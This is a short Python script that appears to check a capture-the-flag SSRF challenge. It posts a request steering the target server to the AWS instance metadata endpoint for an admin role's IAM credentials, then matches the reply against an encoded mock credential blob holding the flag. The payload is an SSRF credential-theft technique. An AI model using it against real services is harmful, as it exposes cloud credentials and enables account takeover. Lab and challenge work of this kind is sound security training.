import requests
url = "TBD"

flag = "ewoJIkNvZGUiOiAiU3VjY2VzcyIsCgkiTGFzdFVwZGF0ZWQiOiAiMjAyMC0wNC0wMlQxODo1MDo0MFoiLAoJIlR5cGUiOiAiQVdTLUhNQUMiLAoJIkFjY2Vzc0tleUlkIjogIjEyMzQ1Njc4OTAxIiwKCSJTZWNyZXRBY2Nlc3NLZXkiOiAidi8xMjM0NTY3ODkwMSIsCgkiVG9rZW4iOiAiZmxhZ3tyaXBfY2FwMX0iLAoJIkV4cGlyYXRpb24iOiAiMjAyMC0wNC0wMlQwMDo0OTo1MVoiCn0="
data = {
	"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/super-secret-admin-role"
}

r = requests.post(url, data=data)
if flag in r.text:
	print("Good")
else:
	print("Bad")